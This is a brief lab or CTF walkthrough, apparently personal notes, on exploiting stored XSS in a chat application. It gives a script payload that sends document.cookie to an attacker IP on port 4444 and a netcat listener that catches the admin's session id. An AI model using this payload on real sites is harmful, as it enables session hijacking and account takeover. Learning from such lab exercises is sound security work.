# XSS
----


--> we got this page on the 3000 port 

![[Pasted image 20210813112804.png]]

--> so Let's register and login 

--> after login we can see some chats and one imput field 

![[Pasted image 20210813112858.png]]

--> so i got the payload in the supporting material so i changed it a bit and made my payload 

```html
<script>window.location='http://10.9.3.121:4444/?cookie='+document.cookie</script>
```

--> so Let's add this payload and listen for connection on port 4444

```c
sudo nc -lvnp 4444
```

--> first we will submit the payload and then start the listening 

--> and after some time we got the admin's session id

![[Pasted image 20210813113230.png]]